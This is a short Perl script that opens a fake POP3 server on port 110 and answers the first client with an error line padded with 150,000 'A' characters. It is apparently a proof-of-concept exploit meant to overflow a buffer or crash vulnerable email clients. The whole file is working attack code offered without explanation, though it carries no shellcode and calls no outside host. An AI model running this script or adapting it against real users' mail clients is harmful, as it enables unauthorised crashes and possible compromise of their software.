#!/usr/bin/perl

use IO::Socket;

$port = 110;

$serv = IO::Socket::INET->new(Proto=>'tcp',
                              LocalPort=>$port,
                              Listen=>1)
or die "Error: listen($port)\n";

$cli = $serv->accept() or die "Error: accept()\n";

$junk    = "A" x 150000;

$payload = "-ERR " . $junk . "\r\n"; # 

     $cli->send($payload);

     close($cli);
     close($serv);
